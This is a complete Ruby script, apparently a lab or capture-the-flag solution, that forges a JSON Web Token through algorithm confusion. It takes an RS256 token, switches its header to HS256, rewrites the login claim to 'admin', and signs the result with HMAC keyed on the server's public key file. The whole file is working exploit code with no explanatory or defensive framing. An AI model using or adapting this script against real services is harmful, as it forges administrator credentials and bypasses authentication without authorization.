#!/usr/bin/env ruby

require "base64"
require "json"
require "openssl"



jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImJkbWluIn0.kxfbDWatwNprK1R7jYrAeKi8V-J_oI9cz6GPDwxdF-iPoGl5c837zPhCWDEPyI4kH6jqs90zxnoilTqVh5euU-UlbD-Ekyv6awMS4xsv8AxezhprOABpuByz7WHHqpeYRPFtJTvDDCUQ-Y9fly7idZN19hkWkRiQGjvkK_EnXfKka4zZsO29eknm2JWDhkhVDIOz5BAyNzqaVw3YW51PJTwoAkCpsE8Egfxxz0hX1m06iaHeOCgJF9Q7y01e0OzXzN-__xrSkXl8ZECVISU7x8nEMDKdfT0LwHT5iFDjzlLtWhEPW0asfM-mZb-l7WGAv0W5dqtvChiqcXQIEccX9w"

if jwt.count(".") != 2
  abort "Error: JWT must have exactly 2 dots"
end

header_encoded, payload_encoded, signature_encoded = jwt.split(".")

header = Base64.urlsafe_decode64(header_encoded)
payload = Base64.urlsafe_decode64(payload_encoded)
signature = Base64.urlsafe_decode64(signature_encoded)

header_hash = JSON.parse(header)

if !header_hash.has_key?("alg")
  abort "Error: Header is missing an alg value"
end

if header_hash["alg"] != "RS256"
  abort "Error: Header has an alg value other than RS256"
end

header_hash["alg"] = "HS256"
header_modified = header_hash.to_json
header_modified_encoded = Base64.urlsafe_encode64(header_modified).split("=")[0]


payload_hash = JSON.parse(payload)

if !payload_hash.has_key?("login")
  abort "Error: Payload is missing a login value"
end

payload_hash["login"] = "admin"
payload_modified = payload_hash.to_json
payload_modified_encoded = Base64.urlsafe_encode64(payload_modified).split("=")[0]


signature_modified = OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), File.read("public.pem"), "#{header_modified_encoded}.#{payload_modified_encoded}")
signature_modified_encoded = Base64.urlsafe_encode64(signature_modified).split("=")[0]

puts "#{header_modified_encoded}.#{payload_modified_encoded}.#{signature_modified_encoded}"
